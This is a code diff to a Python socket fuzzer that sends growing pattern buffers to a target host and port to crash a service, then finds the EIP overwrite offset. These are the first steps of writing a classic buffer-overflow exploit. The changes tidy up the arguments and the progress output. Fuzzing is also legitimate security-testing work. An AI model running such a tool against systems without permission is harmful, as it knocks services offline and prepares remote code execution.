@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 
 import socket
 import os
@@ -9,19 +9,29 @@ from time import sleep
 parser = argparse.ArgumentParser(description='Socket Fuzzer')
 
 parser.add_argument('--prefix',help='Enter the prefix for the command',required=False,dest='prefix',default="")
-parser.add_argument('--target','-t',help='Enter the target host IP address',required=False,default="",dest='target')
-parser.add_argument('--port','-p',help='Enter the target port number',required=False,dest='port',type=int)
-parser.add_argument('--fuzz','-f',help='Fuzz value (using optional prefix)',action='store_true',required=False,default=False,dest='fuzz')
-parser.add_argument('--offset','-o',help='Send offset pattern string',action='store_true',required=False,default=False,dest='offset')
-parser.add_argument('--eip','-e',help='Enter the EIP value to identify offset code',required=False,default="",dest='eip')
+parser.add_argument('--target','-t',help='Enter the target host IP address',required=True,default="",dest='target')
+parser.add_argument('--port','-p',help='Enter the target port number',required=True,dest='port',type=int)
+
+group = parser.add_mutually_exclusive_group(required=True)
+
+group.add_argument('--fuzz','-f',help='Fuzz value (using optional prefix)',action='store_true',required=False,default=False,dest='fuzz')
+group.add_argument('--offset','-o',help='Send offset pattern string',action='store_true',required=False,default=False,dest='offset')
+group.add_argument('--eip','-e',help='Enter the EIP value to identify offset code',required=False,default="",dest='eip')
 
 args = parser.parse_args()
-
 
 host=args.target
 port=args.port
 bufRan = ""
 bufStart = 100
+
+CURSOR_UP_ONE = '\x1b[1A'
+ERASE_LINE = '\x1b[2K'
+
+def delete_last_lines(n=1):
+    for _ in range(n):
+        sys.stdout.write(CURSOR_UP_ONE)
+        sys.stdout.write(ERASE_LINE)
 
 print ("[i] Target:\t" + args.target + ":" + str(args.port))
 print ("[i] Prefix:\t" + args.prefix)
@@ -52,9 +62,9 @@ for u in upper:
                 bufRan += u + l + n
 
 if args.fuzz:
-    
+    prevBufLength = 0
     while (True):
-        buffer = args.prefix.strip() + bufRan[:bufStart - 1]
+        buffer = args.prefix.strip() + bufRan[:bufStart]
 
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -62,15 +72,20 @@ if args.fuzz:
             s.settimeout(3)
             x = s.recv(1024)
             s.send(buffer)
+            bufLength = (len(buffer) - len(args.prefix))
+            prevBufLength = bufLength
+            delete_last_lines()
+            print("[i] Fuzzing:\t" + str(bufLength) + " Bytes")
             s.close()
             sleep(0.5)
             bufStart += 100
         except:
-            print ("[+] Server crashed at %s bytes" % str(len(buffer)))
+            print ("\nInformation:")
+            print ("[+] Server crashed between " + str(prevBufLength) + " and %s Bytes" % str(len(buffer) - len(args.prefix)))
             print ("[!] Send offset pattern using '-o' to identify EIP offset")
             sys.exit()
             
-        buffer = args.prefix + bufRan[:bufStart - 1]
+        buffer = args.prefix + bufRan[:bufStart]
 
 elif (args.offset):
     try:
@@ -83,8 +98,9 @@ elif (args.offset):
         s.close()
         sleep(0.5)
         bufStart += 100
+        print ("\nInformation:")
+        print ("[!] Check EIP for offset value")
     except:
-        print ("[!] Check EIP for offset value" % str(len(buffer)))
         sys.exit()
         
 elif (args.eip):
